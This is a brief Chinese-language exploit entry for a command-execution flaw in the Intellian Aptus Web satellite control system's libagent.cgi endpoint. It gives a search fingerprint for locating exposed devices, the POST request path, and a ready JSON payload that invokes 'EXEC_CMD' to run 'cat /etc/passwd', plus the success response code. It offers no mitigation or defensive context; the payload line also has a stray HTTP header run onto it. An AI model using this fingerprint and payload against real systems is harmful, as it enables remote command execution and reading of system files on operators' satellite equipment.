# IntellianAptusWeb卫星控制系统libagent.cgi存在命令执行漏洞

IntellianAptusWeb ｜ 命令执行 ｜ —
- **指纹**：`title="intellian aptus web"`
- **请求**：`POST /cgi-bin/libagent.cgi?type=J HTTP/1.1`

**Payload**
```
{"O_": "A", "F_": "EXEC_CMD", "S_": 123456789, "P1_": {"Q": "cat /etc/passwd", "F": "EXEC_CMD"}, "V_": 1}Accept-Language: zh-CN,zh;q=0.9
```
- **响应特征**：200